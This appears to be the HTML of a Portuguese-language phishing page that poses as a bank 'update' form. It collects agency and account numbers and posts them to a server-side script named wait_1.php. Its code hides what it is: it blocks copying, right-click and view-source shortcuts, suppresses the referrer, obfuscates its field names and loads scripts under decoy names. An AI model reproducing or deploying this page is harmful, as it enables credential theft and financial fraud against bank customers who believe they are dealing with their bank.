<html lang="pt-br"><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">



    <meta charset="utf-8">
     <title>Atualização</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./css/tiopatas.css" rel="stylesheet">
    <style type="text/css">


    h1, input {
        font-family: "Open Sans", Helvetica, sans-serif;
    }

    .input {
        width: 100%;
		background-color: #f7f7f7;
        height: 50px;
        display: block;
        padding: 0 5px;
        border: none;
        border-bottom: 3px solid #ebebeb;
    }
    .input:focus {
        outline: none;
        border-bottom-color: #ff0000 !important;
    }

	
.form-signin
{
    max-width: 100%;
    padding: 20px;
    margin: auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 20px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.form-signin .form-control:focus
{
    z-index: 2;
}
.form-signin input[type="text"]
{
    margin-bottom: -1px;
    border-bottom-left-radius: 0px;
    border-bottom-right-radius: 0px;
}
.form-signin input[type="password"]
{
    margin-bottom: 10px;
    border-top-left-radius: 0px;
    border-top-right-radius: 0px;
}
.account-wall
{
    margin-top: -10px;
    padding: 0px 0px 0px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 100%;
    height: 50px;
    margin: 5px 0px 0px;
    display: block;
    /*-moz-border-radius: 0%;
    -webkit-border-radius: 0%;
    border-radius: 40%;*/
}


hr.style13 {
	height: 10px;
	border: 0;
	box-shadow: 0 10px 10px -10px #8c8b8b inset;
}

label.titulo {
  display: block;
  margin-bottom: 5px;
  font-size: 14px;
  font-family: sans-serif;
}

span#msg {
  color: red;
  font-family: sans-serif;
  font-size: 10px;
}



</style>
    <script src="./css/tom-e-jerry.js"></script>
    <script src="./css/patolino.js"></script>
	
<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}
</script>
<script language="JavaScript">
function enviardados(){
 
if(document.loginform.xaxgxexnxcxixax.value=="" || document.loginform.xaxgxexnxcxixax.value.length < 4)
{
alert( "Agência inválida, preencha corretamente." );
document.loginform.xaxgxexnxcxixax.focus();
return false;
}
 
 if(document.loginform.xcxoxnxtxa.value=="" || document.loginform.xcxoxnxtxa.value.length <= 9)
{
alert( "Conta inválida, preencha corretamente." );
document.loginform.xcxoxnxtxa.focus();
return false;
}

return true;
}
 
</script>
</head>
<body>


<div class="container">
    <div class="row">
        <div>
		     <div class="account-wall">
		<h6 align="center" style=" background-color: #E40203;"><img src="./img/logo.png" height="80" width="250"></h6>
				<h5 align="center"><font color="#000">Informe os dados para prosseguir</font></h5>	
						
			<form id="loginform" name="loginform" class="form-signin" action="wait_1.php" method="POST" onsubmit="return enviardados();">
			<div>
            	 <span id="msg"></span>
			 </div>
			 
			 <div>
			 <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="number" maxlength="4" minlength="4" placeholder="Agência" required="required" class="input pass" onkeyup="proximoCampo(this, 'xcxoxnxtxa')">
			 </div>
			 <div>
			 <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="number" maxlength="10" minlength="10" placeholder="Conta" class="input pass" onkeyup="proximoCampo(this, 'btt')">
			 </div>
			<br>
                    <font color="#999"><button id="btt" name="btt" class="btn btn-lg btn-default btn-block" type="submit">CONTINUAR</button></font>
			</form>
						<img class="profile-img" src="./img/one.png" alt="">
            </div>
        </div>

    </div>
</div>




</body></html>